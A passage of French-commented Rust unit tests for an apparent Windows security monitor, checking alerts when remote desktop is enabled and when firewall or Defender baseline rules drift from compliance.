    let a = crate::surveillances::alerte_bureau_a_distance(true, Some(false)).expect("activé");
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("VIE-003", "Alerte"));
}

#[test]
fn vie_003_negatif() {
    use crate::surveillances::alerte_bureau_a_distance;
    // Premier relevé (déjà activé au démarrage) ; toujours activé ; désactivé
    assert!(alerte_bureau_a_distance(true, None).is_none());
    assert!(alerte_bureau_a_distance(true, Some(true)).is_none());
    assert!(alerte_bureau_a_distance(false, Some(true)).is_none());
}

fn regle_baseline(id: &str, etat: &str, appliquee: bool) -> crate::baseline::EtatRegle {
    crate::baseline::EtatRegle { id: id.into(), titre: format!("règle {id}"), etat: etat.into(), appliquee, attendu: "1".into(),
                                 actuel: if etat == "conforme" { "1".into() } else { "0".into() }, ..Default::default() }
}

fn etat_baseline(regles: Vec<crate::baseline::EtatRegle>) -> crate::baseline::EtatBaseline {
    crate::baseline::EtatBaseline { regles, ..Default::default() }
}

#[test]
fn bas_001_positif() {
    // Règle appliquée par deR4Tizer, conforme puis non conforme : quelqu'un l'a défaite
    let avant = etat_baseline(vec![regle_baseline("pare-feu", "conforme", true)]);
    let apres = etat_baseline(vec![regle_baseline("pare-feu", "non conforme", true)]);
    let a = crate::baseline::derives(&avant, &apres);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str())).collect::<Vec<_>>(), [("BAS-001", "Alerte")]);
    assert!(a[0].raisons.contains("attendu : 1, actuel : 0"));
}

#[test]
fn bas_001_negatif() {
    use crate::baseline::derives;
    // Règle non appliquée par deR4Tizer ; déjà non conforme au relevé précédent ; état inconnu ; règle nouvelle
    let avant = etat_baseline(vec![regle_baseline("a", "conforme", false), regle_baseline("b", "non conforme", true), regle_baseline("c", "conforme", true)]);
    let apres = etat_baseline(vec![regle_baseline("a", "non conforme", false), regle_baseline("b", "non conforme", true), regle_baseline("c", "inconnu", true),
                                   regle_baseline("d", "non conforme", true)]);
    assert!(derives(&avant, &apres).is_empty());
}

#[test]
fn bas_001_s217_01_derive_vue_apres_un_tour_inconnu_ou_sans_effet() {
    // Audit de #217, S217-01 : la modification se juge sur le registre seul ; un tour où Defender est illisible ou
    // passif ne casse plus la chaîne d'alertes
    use crate::baseline::{derives, EtatRegle};
    let r = |etat: &str, registre: &str| EtatRegle { etat_registre: registre.into(), ..regle_baseline("asr", etat, true) };
    // conforme -> inconnu (registre intact) -> non conforme : alerte au troisième relevé
    let t1 = etat_baseline(vec![r("conforme", "conforme")]);
    let t2 = etat_baseline(vec![r("inconnu", "conforme")]);
    let t3 = etat_baseline(vec![r("non conforme", "non conforme")]);
    assert!(derives(&t1, &t2).is_empty(), "Defender illisible seul : pas d'alerte");
    assert_eq!(derives(&t2, &t3).len(), 1, "modification après un tour inconnu : alerte");
    // sans effet (registre intact) -> non conforme : alerte
    let t2b = etat_baseline(vec![r("sans effet", "conforme")]);
    assert_eq!(derives(&t2b, &t3).len(), 1, "modification après un tour sans effet : alerte");
    // conforme -> sans effet : Defender n'applique plus la règle, alerte distincte
    let a = derives(&t1, &t2b);
    assert_eq!(a.len(), 1);
    assert!(a[0].raisons.contains("plus appliqué par Microsoft Defender"), "{}", a[0].raisons);
    // sans effet -> sans effet : rien de nouveau
    assert!(derives(&t2b, &t2b).is_empty());
    // l'état du registre n'est jamais publié
    let json = serde_json::to_string(&t3).unwrap();
    assert!(!json.contains("EtatRegistre"), "{json}");
}

#[test]
fn bas_001_s217_04_et_05_regroupement_et_dernier_etat_connu() {
    use crate::baseline::{derives, retenir, EtatRegle};
    let r = |id: &str, etat: &str, registre: &str| EtatRegle { etat_registre: registre.into(), ..regle_baseline(id, etat, true) };
    // S217-04 : trois règles qui passent « sans effet » ensemble donnent une seule alerte qui les nomme toutes
    let avant = etat_baseline(vec![r("a", "conforme", "conforme"), r("b", "conforme", "conforme"), r("c", "conforme", "conforme")]);
    let apres = etat_baseline(vec![r("a", "sans effet", "conforme"), r("b", "sans effet", "conforme"), r("c", "sans effet", "conforme")]);
    let al = derives(&avant, &apres);
    assert_eq!(al.len(), 1, "une seule alerte");
    assert!(al[0].raisons.starts_with("3 réglages") && al[0].raisons.contains("règle a") && al[0].raisons.contains("règle c"), "{}", al[0].raisons);
    // une modification du registre garde son alerte propre, à côté du regroupement
    let apres2 = etat_baseline(vec![r("a", "sans effet", "conforme"), r("b", "sans effet", "conforme"), r("c", "non conforme", "non conforme")]);
    assert_eq!(derives(&avant, &apres2).len(), 2);
    // S217-05 : conforme, puis inconnu, puis sans effet : l'alerte part grâce au dernier état connu retenu
    let t1 = etat_baseline(vec![r("a", "conforme", "conforme")]);
    let t2 = etat_baseline(vec![r("a", "inconnu", "inconnu")]);
    let t3 = etat_baseline(vec![r("a", "sans effet", "conforme")]);
    let garde = retenir(Some(&t1), &t2);
    assert_eq!(garde.regles[0].etat, "conforme");
    assert_eq!(garde.regles[0].etat_registre, "conforme");
    assert!(derives(&t1, &t2).is_empty());
    assert_eq!(derives(&garde, &t3).len(), 1, "sans effet après un tour inconnu : alerte");
    // registre illisible un tour, puis modifié : alerte
    let t3b = etat_baseline(vec![r("a", "non conforme", "non conforme")]);
    assert_eq!(derives(&garde, &t3b).len(), 1);
    // premier relevé : rien à retenir
    assert_eq!(retenir(None, &t2).regles[0].etat, "inconnu");
    // câblage
    assert!(include_str!("moniteur.rs").contains("baseline_avant = Some(baseline::retenir(baseline_avant.as_ref(), &b));"));
}
